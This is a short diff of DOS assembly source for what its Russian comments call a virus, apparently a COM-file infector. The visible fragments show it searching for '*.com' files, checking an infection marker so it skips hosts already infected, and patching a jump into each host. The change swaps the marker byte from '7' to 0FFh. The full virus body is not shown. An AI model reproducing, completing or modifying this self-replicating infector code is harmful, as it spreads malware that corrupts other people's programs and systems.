@@ -4,7 +4,7 @@ org 100h
 
 start:
 jmp near ptr vir
-db '7'
+db 0ffh
 
 vir: ; Начало вируса
 call next
@@ -40,7 +40,7 @@ int 21h
 jc find_next
 
 proverka:
-cmp byte ptr[bp+old_bytes+3],'7'
+cmp byte ptr[bp+old_bytes+3],0ffh
 jz find_next
 
 write_vir:
@@ -91,7 +91,7 @@ maska db '*.com',0
 
 new_bytes db 0e9h ;команда jmp
 dw 0 ;смещение на которое прыгает jmp
-db '7' ;метка заражения
+db 0ffh ;метка заражения
 
 vir_len equ $-vir
 end start
